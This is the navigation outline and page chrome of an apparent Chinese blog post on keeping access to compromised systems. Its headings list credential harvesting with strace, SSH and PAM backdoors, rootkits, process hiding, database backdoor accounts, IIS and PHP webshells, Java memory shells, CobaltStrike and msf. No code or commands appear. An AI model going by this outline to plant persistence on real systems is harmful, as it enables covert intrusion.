class="nav-text">setuid and setgid</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">2.1.2.5.</span> <span class="nav-text">strace</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#null"><span class="nav-number">2.1.2.5.1.</span> <span class="nav-text">收集任意已有进程登录凭证</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#null"><span class="nav-number">2.1.2.5.2.</span> <span class="nav-text">收集任意指定程序登录凭证</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">2.1.2.6.</span> <span class="nav-text">SSH Wrapper（测试会导致正常登陆无法使用）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">2.1.2.7.</span> <span class="nav-text">Openssh Rookit（暂不使用）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">2.1.2.8.</span> <span class="nav-text">PAM后门（暂不使用）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">2.2.</span> <span class="nav-text">隐藏技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">2.2.1.</span> <span class="nav-text">简单的隐藏文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">2.2.2.</span> <span class="nav-text">隐藏权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">2.2.3.</span> <span class="nav-text">SSH隐身登录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">2.2.4.</span> <span class="nav-text">Rookit-Reptile</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">2.2.5.</span> <span class="nav-text">隐藏进程（未测试）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">2.2.6.</span> <span class="nav-text">linux-inject（一般用不到）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">2.3.</span> <span class="nav-text">参考</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">3.</span> <span class="nav-text">数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">3.1.</span> <span class="nav-text">mssql</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">3.1.1.</span> <span class="nav-text">触发器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">3.1.2.</span> <span class="nav-text">后门账号</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">3.2.</span> <span class="nav-text">mysql</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">3.2.1.</span> <span class="nav-text">后门账号</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">3.3.</span> <span class="nav-text">oracle</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">3.3.1.</span> <span class="nav-text">后门账号</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">4.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">4.1.</span> <span class="nav-text">IIS后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">4.2.</span> <span class="nav-text">php不死马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">4.3.</span> <span class="nav-text">java内存马</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">5.</span> <span class="nav-text">权限维持工具</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">5.1.</span> <span class="nav-text">CobaltStrike</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">5.2.</span> <span class="nav-text">msf</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">cty</p>
  <div class="site-description" itemprop="description">whoami</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">9</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">cty</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">chenfan</a> 强力驱动 v4.2.0
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.2
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  
  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
  
</body>
</html>
